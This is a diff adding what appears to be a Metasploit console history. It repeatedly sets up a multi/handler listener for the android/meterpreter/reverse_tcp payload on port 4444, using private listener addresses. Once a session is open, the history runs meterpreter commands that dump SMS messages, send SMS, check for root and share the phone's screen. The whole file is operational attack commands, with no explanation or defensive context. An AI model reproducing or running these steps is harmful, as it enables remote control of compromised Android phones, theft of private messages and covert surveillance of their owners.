@@ -1,0 +1,62 @@
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 10.0.2.15
+set LPORT 4444
+show options
+exploit
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 192.168.56.1
+set LPORT 4444
+show options
+exploit
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 10.48.16.11
+set LPORT 4444
+show options
+exploit
+dump_sms
+send_sms
+check_root
+screenshare
+exit
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+exit
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 10.48.16.11
+set LPORT 4444
+show options
+exploit
+exit
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 10.48.16.11
+set LPORT 4444
+exploit
+help
+meterpreter
+exit
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 10.48.16.11
+set LPORT 4444
+exploit
+exit
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 10.48.16.11
+set LPORT 4444
+exploit
+close
+exit
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 10.48.16.11
+set LPORT 4444
+exploit
+exit
